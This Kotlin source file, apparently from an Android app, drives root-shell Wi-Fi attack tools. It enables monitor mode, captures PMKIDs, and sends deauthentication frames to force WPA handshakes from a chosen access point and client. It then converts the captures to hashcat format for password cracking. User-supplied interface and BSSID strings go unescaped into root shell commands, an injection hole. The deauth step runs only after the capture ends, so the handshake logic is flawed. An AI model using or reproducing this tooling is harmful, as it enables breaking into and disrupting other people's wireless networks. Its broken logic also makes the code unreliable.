package com.alexcupsa.wifithermal.core.engine.monitor

import com.alexcupsa.wifithermal.core.common.root.RootResult
import com.alexcupsa.wifithermal.core.common.root.RootShell
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import javax.inject.Inject
import javax.inject.Singleton

data class WifiInterface(
    val name: String,
    val mode: String,
    val macAddress: String?,
    val driver: String?,
    val chipset: String?,
    val supportsMonitor: Boolean,
)

sealed interface MonitorModeResult {
    data class Success(val monitorInterface: String) : MonitorModeResult
    data class Failed(val reason: String) : MonitorModeResult
}

sealed interface CaptureEvent {
    data class HandshakeFrame(
        val bssid: String,
        val clientMac: String,
        val messageNumber: Int,
        val rawHex: String,
    ) : CaptureEvent

    data class PmkidFrame(
        val bssid: String,
        val clientMac: String,
        val pmkidHex: String,
    ) : CaptureEvent

    data class ProbeRequest(
        val clientMac: String,
        val ssid: String,
    ) : CaptureEvent

    data class Beacon(
        val bssid: String,
        val ssid: String,
        val channel: Int,
        val rssi: Int,
    ) : CaptureEvent

    data class Status(val message: String) : CaptureEvent
    data class Error(val message: String) : CaptureEvent
}

@Singleton
class MonitorMode @Inject constructor(
    private val rootShell: RootShell,
) {
    companion object {
        private const val TERMUX_BIN = "/data/data/com.termux/files/usr/bin"
        private const val AIRMON_PATH = "$TERMUX_BIN/airmon-ng"
        private const val AIRODUMP_PATH = "$TERMUX_BIN/airodump-ng"
        private const val AIREPLAY_PATH = "$TERMUX_BIN/aireplay-ng"
        private const val HCXDUMPTOOL_PATH = "$TERMUX_BIN/hcxdumptool"
        private const val HCXPCAPNGTOOL_PATH = "$TERMUX_BIN/hcxpcapngtool"
    }

    suspend fun listInterfaces(): RootResult<List<WifiInterface>> {
        val result = rootShell.exec("iw dev")
        if (result !is RootResult.Success) {
            return when (result) {
                is RootResult.Error -> RootResult.Error(result.code, result.message)
                RootResult.NoRoot -> RootResult.NoRoot
                RootResult.Timeout -> RootResult.Timeout
                else -> RootResult.Error(-1, "Unknown error")
            }
        }

        val interfaces = mutableListOf<WifiInterface>()
        var currentInterface: String? = null
        var currentMode = "managed"
        var currentMac: String? = null

        for (line in result.data.lines()) {
            val interfaceMatch = Regex("""Interface\s+(\S+)""").find(line)
            if (interfaceMatch != null) {
                currentInterface?.let {
                    interfaces.add(
                        WifiInterface(
                            name = it,
                            mode = currentMode,
                            macAddress = currentMac,
                            driver = null,
                            chipset = null,
                            supportsMonitor = true,
                        )
                    )
                }
                currentInterface = interfaceMatch.groupValues[1]
                currentMode = "managed"
                currentMac = null
            }

            val modeMatch = Regex("""type\s+(\S+)""").find(line)
            if (modeMatch != null) {
                currentMode = modeMatch.groupValues[1]
            }

            val macMatch = Regex("""addr\s+([0-9a-fA-F:]{17})""").find(line)
            if (macMatch != null) {
                currentMac = macMatch.groupValues[1]
            }
        }

        currentInterface?.let {
            interfaces.add(
                WifiInterface(
                    name = it,
                    mode = currentMode,
                    macAddress = currentMac,
                    driver = null,
                    chipset = null,
                    supportsMonitor = true,
                )
            )
        }

        return RootResult.Success(interfaces)
    }

    suspend fun enableMonitorMode(interface_: String): MonitorModeResult {
        val killResult = rootShell.exec("$AIRMON_PATH check kill")
        if (killResult is RootResult.Error) {
            val directKill = rootShell.exec("pkill wpa_supplicant; pkill hostapd")
        }

        val enableResult = rootShell.exec("$AIRMON_PATH start $interface_")

        return when (enableResult) {
            is RootResult.Success -> {
                val output = enableResult.data
                val monMatch = Regex("""\(monitor mode.*?enabled.*?(\w+mon|\w+)\)""").find(output)
                    ?: Regex("""monitor mode.*?on\s+(\S+)""").find(output)

                if (monMatch != null) {
                    MonitorModeResult.Success(monMatch.groupValues[1])
                } else {
                    val manualResult = rootShell.exec(
                        "ip link set $interface_ down && " +
                            "iw dev $interface_ set type monitor && " +
                            "ip link set $interface_ up"
                    )
                    if (manualResult is RootResult.Success) {
                        MonitorModeResult.Success(interface_)
                    } else {
                        MonitorModeResult.Failed("Failed to enable monitor mode")
                    }
                }
            }
            is RootResult.Error -> MonitorModeResult.Failed(enableResult.message)
            RootResult.NoRoot -> MonitorModeResult.Failed("Root access required")
            RootResult.Timeout -> MonitorModeResult.Failed("Operation timed out")
        }
    }

    suspend fun disableMonitorMode(monitorInterface: String): RootResult<Unit> {
        val result = rootShell.exec("$AIRMON_PATH stop $monitorInterface")
        return when (result) {
            is RootResult.Success -> RootResult.Success(Unit)
            is RootResult.Error -> {
                val manualResult = rootShell.exec(
                    "ip link set $monitorInterface down && " +
                        "iw dev $monitorInterface set type managed && " +
                        "ip link set $monitorInterface up"
                )
                if (manualResult is RootResult.Success) {
                    RootResult.Success(Unit)
                } else {
                    RootResult.Error(-1, "Failed to disable monitor mode")
                }
            }
            RootResult.NoRoot -> RootResult.NoRoot
            RootResult.Timeout -> RootResult.Timeout
        }
    }

    suspend fun setChannel(interface_: String, channel: Int): RootResult<Unit> {
        val result = rootShell.exec("iw dev $interface_ set channel $channel")
        return when (result) {
            is RootResult.Success -> RootResult.Success(Unit)
            is RootResult.Error -> RootResult.Error(result.code, result.message)
            RootResult.NoRoot -> RootResult.NoRoot
            RootResult.Timeout -> RootResult.Timeout
        }
    }

    fun capturePmkid(
        interface_: String,
        targetBssid: String?,
        outputPath: String,
        durationSeconds: Int = 60,
    ): Flow<CaptureEvent> = flow {
        emit(CaptureEvent.Status("Starting PMKID capture..."))

        val filterArg = targetBssid?.let { "--filterlist_ap=$it --filtermode=2" } ?: ""
        val cmd = "$HCXDUMPTOOL_PATH -i $interface_ -o $outputPath " +
            "--enable_status=1 $filterArg"

        val result = rootShell.exec(cmd, timeoutMs = (durationSeconds * 1000L) + 10_000)

        when (result) {
            is RootResult.Success -> {
                val output = result.data
                val pmkidMatch = Regex("""PMKID.*?([0-9a-fA-F:]{17})""").findAll(output)
                pmkidMatch.forEach { match ->
                    emit(CaptureEvent.Status("Captured PMKID for ${match.groupValues[1]}"))
                }

                val convertResult = rootShell.exec(
                    "$HCXPCAPNGTOOL_PATH -o ${outputPath}.22000 $outputPath"
                )
                if (convertResult is RootResult.Success) {
                    emit(CaptureEvent.Status("Converted to hashcat format: ${outputPath}.22000"))
                }
            }
            is RootResult.Error -> emit(CaptureEvent.Error(result.message))
            RootResult.NoRoot -> emit(CaptureEvent.Error("Root access required"))
            RootResult.Timeout -> emit(CaptureEvent.Status("Capture timeout reached"))
        }
    }.flowOn(Dispatchers.IO)

    fun captureHandshake(
        interface_: String,
        targetBssid: String,
        targetChannel: Int,
        clientMac: String?,
        outputPath: String,
        deauthCount: Int = 5,
        durationSeconds: Int = 120,
    ): Flow<CaptureEvent> = flow {
        emit(CaptureEvent.Status("Setting channel $targetChannel..."))
        setChannel(interface_, targetChannel)

        emit(CaptureEvent.Status("Starting airodump-ng capture..."))

        val airodumpCmd = "$AIRODUMP_PATH -c $targetChannel --bssid $targetBssid " +
            "-w ${outputPath.removeSuffix(".cap")} $interface_"

        val captureJob = rootShell.exec(
            "timeout ${durationSeconds}s $airodumpCmd",
            timeoutMs = (durationSeconds * 1000L) + 10_000,
        )

        if (deauthCount > 0) {
            emit(CaptureEvent.Status("Sending $deauthCount deauth frames..."))
            val deauthTarget = clientMac?.let { "-c $it" } ?: ""
            rootShell.exec(
                "$AIREPLAY_PATH -0 $deauthCount -a $targetBssid $deauthTarget $interface_",
                timeoutMs = 30_000,
            )
        }

        when (captureJob) {
            is RootResult.Success -> {
                val output = captureJob.data
                if (output.contains("WPA handshake", ignoreCase = true)) {
                    emit(CaptureEvent.Status("Handshake captured!"))

                    val convertResult = rootShell.exec(
                        "$HCXPCAPNGTOOL_PATH -o ${outputPath}.22000 ${outputPath.removeSuffix(".cap")}-01.cap"
                    )
                    if (convertResult is RootResult.Success) {
                        emit(CaptureEvent.Status("Converted to hashcat format"))
                    }
                } else {
                    emit(CaptureEvent.Status("No handshake captured in time window"))
                }
            }
            is RootResult.Error -> emit(CaptureEvent.Error(captureJob.message))
            RootResult.NoRoot -> emit(CaptureEvent.Error("Root access required"))
            RootResult.Timeout -> emit(CaptureEvent.Status("Capture timeout"))
        }
    }.flowOn(Dispatchers.IO)

    suspend fun isAircrackInstalled(): Boolean {
        val result = rootShell.exec("test -x '$AIRMON_PATH' && echo yes || echo no")
        return result is RootResult.Success && result.data.trim() == "yes"
    }

    suspend fun isHcxInstalled(): Boolean {
        val result = rootShell.exec("test -x '$HCXDUMPTOOL_PATH' && echo yes || echo no")
        return result is RootResult.Success && result.data.trim() == "yes"
    }
}
